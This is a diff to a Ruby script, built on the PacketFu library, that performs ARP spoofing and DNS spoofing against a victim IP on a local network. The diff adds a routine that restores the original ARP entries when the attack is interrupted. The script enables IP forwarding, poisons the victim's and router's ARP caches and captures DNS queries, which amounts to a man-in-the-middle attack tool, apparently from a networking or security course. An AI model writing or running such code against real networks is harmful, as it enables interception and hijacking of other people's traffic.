@@ -9,7 +9,9 @@ unless (ARGV.size == 2)
 	exit
 end
 
+
 def init(intface, victimIP)
+
 	@interface = intface
 	@victimIP = victimIP
 	@routerIP = "192.168.0.100"
@@ -40,6 +42,33 @@ def init(intface, victimIP)
 	# Initialize IP Forwarding
 	`echo 1 > /proc/sys/net/ipv4/ip_forward`
 
+end
+
+def revertArpPackets()
+	
+	#Construct the target's packet
+	arp_packet_target = PacketFu::ARPPacket.new()
+	arp_packet_target.eth_saddr = @routerMAC 
+	arp_packet_target.eth_daddr = @victimMAC 
+	arp_packet_target.arp_saddr_mac = @routerMAC
+	arp_packet_target.arp_daddr_mac = @victimMAC
+	arp_packet_target.arp_saddr_ip = @routerIP
+	arp_packet_target.arp_daddr_ip = @victimIP
+	arp_packet_target.arp_opcode = 2
+	 
+	# Construct the router's packet
+	arp_packet_router = PacketFu::ARPPacket.new()
+	arp_packet_router.eth_saddr = @victimMAC
+	arp_packet_router.eth_daddr = @routerMAC
+	arp_packet_router.arp_saddr_mac = @victimMAC
+	arp_packet_router.arp_daddr_mac = @routerMAC
+	arp_packet_router.arp_saddr_ip = @victimIP 
+	arp_packet_router.arp_daddr_ip = @routerIP
+	arp_packet_router.arp_opcode = 2
+	
+	arp_packet_target.to_w(@interface)
+	arp_packet_router.to_w(@interface)
+	
 end
 
 def spoofThread(arp_packet_victim, arp_packet_router)
@@ -121,7 +150,9 @@ begin
 	puts "Victim IP: " + victIP
 	puts "Interface: " + intface
 
+
 	init(intface, victIP)
+
 
 	puts "Source MAC: " + @srcMAC[:eth_saddr].to_s
 	puts "Dest MAC: " + @victimMAC.to_s
@@ -140,7 +171,7 @@ begin
 
 	puts "Capturing DNS Queries..."
 	capture.stream.each do |packet|
-	puts "Captured packet"
+		puts "Captured packet"
 
 		@packet = PacketFu::Packet.parse(packet)
 		dnsQuery = @packet.payload[2].to_s + @packet.payload[3].to_s
@@ -159,6 +190,7 @@ begin
 	rescue Interrupt
 		puts "\nDNS spoof interrupt detected."
 		Thread.kill(arp_spoof_thread)
+		revertArpPackets()
 		`echo 0 > /proc/sys/net/ipv4/ip_forward`
 		exit 0
 
